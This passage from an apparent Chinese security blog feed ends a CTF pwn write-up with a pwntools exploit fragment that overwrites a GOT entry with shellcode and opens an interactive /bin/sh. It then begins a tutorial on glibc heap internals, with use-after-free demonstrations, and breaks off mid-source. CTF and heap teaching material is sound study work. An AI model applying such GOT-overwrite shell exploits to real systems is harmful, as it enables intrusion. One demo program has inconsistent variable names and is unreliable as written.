class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">deleteNote(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 基
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="堆相关题目" scheme="https://muzibing.github.io/tags/%E5%A0%86%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深的剖析堆</title>
    <link href="https://muzibing.github.io/2020/07/13/2020.07.13%EF%BC%88136%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/13/2020.07.13（136）/</id>
    <published>2020-07-12T16:00:00.000Z</published>
    <updated>2020-07-14T15:00:52.603Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>     只要学过C语言的同学想必都申请过堆内存吧，那么大家是否真正了解申请堆和释放堆后面的机制吗？今天我就带领大家一步一步的来了解，先在这里留一个问题：<code>上述代码是否有漏洞？</code>以后会慢慢的揭开这个答案，本文均是在64位下进行的实验。</p><h3 id="font-color-navy0x00-什么是堆font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是堆font"></a> <font color="navy"><code>0x00 什么是堆？</code></font></h3><blockquote><p>在计算机科学中, 动态内存分配（Dynamic memory allocation）又称为堆内存分配，是指计算机程序在运行期中分配使用内存。它可以当成是一种分配有限内存资源所有权的方法。动态分配的内存在被程序员明确释放或被垃圾回收之前一直有效。与静态内存分配的区别在于没有一个固定的生存期。这样被分配的对象称之为有一个“动态生存期”。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p></blockquote><p>      简而言之，堆就是程序员动态分配的一个内存空间，它在进程内存中的分布如下：</p><p><img src="/images/136-1.png" alt></p><center><font size="2">图1</font></center><p>      从上图可以看出堆是由<strong>低地址向高地址生长的</strong>，这一点必须要清楚。虽然程序可以请求一块连续内存，并自由地使用，但是还应清楚：<strong>堆在内存空间中不一定连续</strong>。</p><p>      下面我们运行一下上述的代码，在main函数打个断点，当运行完<code>call malloc</code>后，该函数会返回给寄存器<code>eax</code>一个值，这个值就是动态申请的返回的指针<code>ptr</code>。</p><p><img src="/images/136-4.png" alt></p><center><font size="2">图2</font></center><blockquote><p>从上图可以看出返回的地址为<code>0x5555555592a0</code>，对于chunk来说这只是user_content的开始，不是chunk的地址，这块后面会详细讲解。</p></blockquote><p><img src="/images/136-2.png" alt></p><center><font size="2">图3</font></center><blockquote><p>从上图中可以看出，在执行malloc之后在程序的虚拟内存空间中映射了一个heap区域（有关虚拟地址的映射我会在后期在单独写一篇），也就是说这个时候堆已经分配成功了，那么我们计算一下映射的堆的大小是多少：<code>0x000055555557a000- 0x0000555555559000=0x21000（132KB）</code>，下面我们进行验证，看一下堆中的情况，如下图：</p></blockquote><p><img src="/images/136-3.png" alt></p><center><font size="2">图4</font></center><blockquote><p>如上图所示，执行完malloc后会有三个堆块，在这里先不说这些堆块的意义，只是计算一下它们的合计大小：<code>0x290+0x40+0x20d63=0x21000</code>，验证成功。在这里留几个问题：</p><ol><li><font color="green">【图一】返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</font></li><li><font color="green">【图一】我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</font></li><li><font color="green">【图二】我们只申请了大小为50个字节的堆空间，为什么给我们分配了<code>132KB</code>大小的堆空间？</font></li><li><font color="green">【图三】我们只申请了一个堆块，为什么堆空间中有三个堆块？</font></li></ol></blockquote><p>      下面我们还不会讲malloc背后的原理，让我们带着这些问题走进堆的学习。</p><h3 id="font-color-navy0x01-chunk讲解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-chunk讲解font"></a> <font color="navy"><code>0x01 Chunk讲解</code></font></h3><p>      首先来看chunk的结构，下面给出chunk的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从官方给出的源码中可以看出，chunk有两种结构，分别是<code>malloced chunk</code>和<code>freed chunk</code>，下面根据源码中的数据结构给出两种chunk的结构示意图，在这里给出的是64位下的，对齐字节为16字节。</p></blockquote><p><img src="/images/136-5.png" alt></p><center><font size="2">图5</font></center><blockquote><p>注释：</p><ul><li><code>prev_size</code>：当标志位p=0时，表示前面的chunk处于free状态，这时这里表示的是前一个chunk的大小；当p=1时，表示前面的chunk处于malloc状态，这时这里的数据可以被前面的chunk复用，下面会有例子说明；</li><li><code>size</code>：当前整个chunk的大小</li><li><code>user content</code>：用户申请的大小</li><li><code>A/M/P</code>：标志位<ul><li>A：A=0 为主分区（main_arena）分配，A=1 为非主分区分配</li><li>M：M=0为使用heap区域，M=1表示使用mmap映射区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效，P=1表示pre_chunk在使用中，prev_size被pre_chunk复用</li></ul></li><li><code>fd</code>：前一个堆块的地址（不是返回给用户的地址哦），只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>bk</code>：后一个堆块的地址，只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>fd_nextsize</code>： <strong>Only used for large blocks: pointer to next larger size</strong></li><li><code>bk_nextsize</code>：<strong>Only used for large blocks: pointer to prev larger size</strong></li></ul></blockquote><p>      有了上述的知识储备，那么我们就可以来回答第一个问题：<code>返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</code>我们从图5中可以看到，我们<strong>申请的堆空间只是user_content部分</strong>，<strong>而chunk真正的起始地址应该是指向prev_size的部分</strong>，所以chunk的起始地址应该为<code>返回给用户的地址-0x10=chunk的起始地址</code>，那么我们也就解决了第1个问题：<code>0x5555555592a0-0x10 = 0x555555559290</code></p><h3 id="font-color-navy0x02-main_arenafont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-main_arenafont"></a> <font color="navy"><code>0x02 main_arena</code></font></h3><p>      这里就是要回答第二个、第三个和第四个问题。在上述例子中，我们申请了50bytes大小的堆，操作系统却给我们申请了132KB大小的堆空间，这是为什么呢？首先在这里先向大家引入一个概念：<code>main_arena</code>，如下图：</p><p><img src="/images/136-6.png" alt></p><center><font size="2">图6</font></center><blockquote><p><code>main_arena</code>是由主线程分配的堆空间，<code>main_arena</code>中含有多个chunk，也就是返回给我们申请的堆的地址。因为132KB远远大于50B，所以如果主线程后续再申请堆空间的话，就会先从这132KB的剩余部分进行申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。<sup>[1]</sup></p></blockquote><p>      通过上述的介绍，我想<strong>第三个问题已经被解决了</strong>，下面开始第二个问题：<code>我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</code>通过上图我们可以看出，我们申请的50B大小的chunk，只是user_content部分的大小，所以真正的chunk大小应该是<code>0x8(prev_size)+0x8(size)+50=66Bytes</code>，但是从第2张图片中我们看到系统却只给我们64KB，这是为什么呢？还记得上一节中讲的chunk的标志位吗？当p=1时，则表示pre_chunk在使用中，prev_size被pre_chunk复用，对！这里就是这个意思，也就是说我们申请的堆块有2字节被放在了next chunk的prev_size字段中，下面我们可以写个程序验证一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      在执行了mecpy函数后，我们看一下堆中的存储情况，因为我们输入的字符串长度为50，正好是我们申请的大小，所以这里没有堆溢出，那么现在预测一下chunk的user_content，应该都是&quot;a&quot;，next_chunk的prev_size部分应该是&quot;b&quot;，如下图：</p><p><img src="/images/136-7.png" alt></p><center><font size="2">图7</font></center><blockquote><p>有关第二个问题，可以这样回答：因为我们申请的是50B大小的chunk，但是实际chunk的大小应该是：<code>用户申请的大小+16+nextchunk可以被复用的部分-prevchunk被复用的部分</code></p></blockquote><p>      下面只有第四个问题没有解决了：<code>我们只申请了一个堆块，为什么堆空间中有三个堆块？</code>在这里需要在main_arena区域中引入两个新的概念：<code>top chunk</code>和（<code>另外一个还没搞明白</code>），如下图：</p><p><img src="/images/136-8.jpg" alt></p><center><font size="2">图8</font></center><blockquote><p>从上图中可以看到，除了用户申请的chunk外的空间，处于高地址部分的为top chunk，该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。<sup>[1]</sup></p></blockquote><h3 id="font-color-navy0x03-malloc机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-malloc机制font"></a> <font color="navy"><code>0x03 malloc机制</code></font></h3><p>      在linux平台malloc本质上都是通过系统调用<strong>brk</strong>或者<strong>mmap</strong>实现的，如下图：</p><p><img src="/images/136-9.png" alt></p><center><font size="2">图9</font></center><blockquote><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><p>1、brk是将数据段(.data)的最高地址指针_edata往高地址推；</p><p>2、mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。</p><pre><code> 这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</code></pre><p>在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。<sup>[3]</sup></p></blockquote><p><code>brk()函数</code></p><blockquote><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="noopener">brk</a>通过增加program break的位置（brk）从内核申请（非零值初始化的）内存。一开始，堆段(heap segment)的起始位置（start_brk）和结束位置(brk)指向同一个位置：</p><ul><li>当ASLR（Address Space Layout Randomization）关闭时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（end_data）。</li><li>当ASLR打开时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（<code>end_data</code>）再加上一个随机的brk偏移。</li></ul><p>上面的进程虚拟内存布局图展示了，start_brk是堆段的开始位置，brk(program break)则是堆段的结束位置。</p><p>malloc小于<code>M_MMAP_THRESHOLD</code>（默认为128KB）的内存<sup>[５]</sup>，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：<sup>[4]</sup></p></blockquote><p><img src="/images/136-10.jpg" alt></p><center><font size="2">图10</font></center><blockquote><ol><li><p>进程启动的时候，其（虚拟）内存空间的初始布局如图10-(1)所示。</p><p>其中，mmap内存映射文件是在堆和栈的中间（<a href="http://xn--libc-2-9v9ii49d.2.93.so" target="_blank" rel="noopener">例如libc-2.2.93.so</a>，其它数据文件等），为了简单起见，省略了内存映射文件。_edata指针（glibc里面定义）指向数据段的最高地址。</p></li><li><p>进程调用**A=malloc(30KB)**以后，内存空间如图10-(2)：</p><ul><li><p>malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。</p></li><li><p>你可能会问：只要把_edata+30K就完成内存分配了？</p></li><li><p>事实是这样的，_edata+30K只是完成虚拟地址的分配，<strong>A这块内存现在还是没有物理页与之对应的</strong>，等到进程第一次读写A这块内存的时候，<strong>发生缺页中断，内核才分配A这块内存对应的物理页</strong>。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</p></li></ul></li><li><p>进程调用B=malloc(40K)以后，内存空间如图10-(3)。</p></li></ol></blockquote><p><code>mmap()函数</code></p><blockquote><p>malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="noopener">mmap</a>创建一个私有匿名的映射段。这个映射段的主要目的是申请一块（零值初始化的）新内存，这块内存处于栈和堆之间，并且<strong>这块内存只能被调用的这个进程独占使用</strong>。<sup>[4]</sup>当主线程malloc的大小大于128KB时以及子线程在申请动态内存时，会用到mmap来申请。</p></blockquote><p><img src="/images/136-11.png" alt></p><center><font size="2">图11</font></center><blockquote><ol><li><p>进程调用C=malloc(200K)以后，内存空间如图11-(4)：</p><p>默认情况下，malloc函数分配内存，如果请<strong>求内存大于128K</strong>（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是<strong>利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</strong></p><p>这样子做主要是因为：<strong>brk分配的内存需要等到高地址内存释放以后才能释放</strong>（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。<br>当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。</p></li><li><p>进程调用D=malloc(100K)以后，内存空间如图11-(5)；</p></li><li><p>进程调用<code>free(C)</code>以后，C对应的虚拟内存和物理内存一起释放如图11-(6)。</p></li></ol></blockquote><p><code>总结</code>：</p><ol><li>我们申请动态内存空间，实质上是由brk或mmap函数来完成的</li><li>申请的动态内存空间实质上是Arena区域的一个chunk，并且我们申请的大小只不过是user_content并不是整个chunk的大小</li><li>chunk在使用时和空闲时分别有着对应的状态，两者有着差别</li><li>堆的生长空间是从低地址到高地址</li></ol><h3 id="font-color-navy0x04-free机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-free机制font"></a> <font color="navy"><code>0x04 Free机制</code></font></h3><p>      还记得文章开头的程序代码吗？我问了一个问题：<font color="red"><code>程序代码中有什么问题吗？</code> </font>下面就来看看上述代码有没有问题。给我们申请的内存赋值50个字符串后，我们再调用free函数，这个时候看一下chunk中的情况，如下图：</p><p><img src="/images/136-12.png" alt></p><center><font size="2">图12</font></center><blockquote><p>从图中看到，在free之后，chunk的结构发生了变化，但是除了<code>fd</code>和<code>bk</code>部分的数据改变以外，其他的数据并没有发生改变，那么在free之后我们是否能将剩下的数据打印出来呢？下面写个程序验证一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">[*] After  free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br></pre></td></tr></table></figure><blockquote><p>可以看出虽然我们free了chunk，但是我们仍然可以通过指针来访问chunk上的数据，所以说在free之后，我们一定要将指针置0，如下程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><blockquote><p>可以看出在打印free后的chunk情况时发生了段错误，因为puts中的参数为0x10c，是内核地址，所以不能访问。</p></blockquote><p><font size="5"><strong>敲黑板！敲黑板！敲黑板！</strong></font>这里再提出一个问题：<code>free后的chunk去哪了？我们再次申请同样大小的chunk，会返回什么指针？</code>这里先解决第二个问题：<code>在free chunk后，再次申请同样大小的chunk，这时返回用户的指针是什么呢？</code>下面还是用程序进行验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr0,*ptr1;</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr0,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"   </span></span><br><span class="line"><span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk0:%p\n"</span>,ptr0);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ptr0 = NULL\n"</span>);</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk1:%p\n"</span>,ptr1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] The address of chunk0:0x5652b84e52a0</span><br><span class="line">[+] ptr0 = NULL</span><br><span class="line">[*] The address of chunk1:0x5652b84e52a0</span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出我<strong>们第一次和第二次返回的指针相同，也就说明我们两次申请的动态内存空间是同一个空间</strong>，这是什么原因呢？下面就一步一步来解决这个问题：在堆释放后，为了充分利用chunk，系统并不会立即收回chunk，而是把chunk放到一个地方，如果程序中再次申请同样大小的chunk时，会直接将该chunk的地址返回，这里说的地方就是存放空闲chunk的链表结构<code>bins</code>，这里涉及的结构体就是malloc_state，如下是它的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in 